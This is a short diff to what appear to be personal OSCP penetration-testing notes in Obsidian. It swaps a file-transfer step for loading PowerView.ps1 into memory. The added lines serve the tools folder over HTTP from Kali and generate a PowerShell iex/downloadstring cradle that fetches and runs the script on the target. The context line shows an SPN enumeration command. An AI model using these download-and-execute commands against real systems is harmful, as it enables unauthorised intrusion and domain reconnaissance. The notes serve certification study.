@@ -16,7 +16,23 @@ setspn -Q */*
 
 ---
 
-Transfer [[PowerView.ps1]] to target first
+Load PowerView.ps1 into memory 
+
+On KALI
+```
+python -m http.server 80 --directory ~/Desktop/Tools/Windows
+```
+
+On TARGET
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";
+
+const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 Verify commands are loaded
 ```powershell
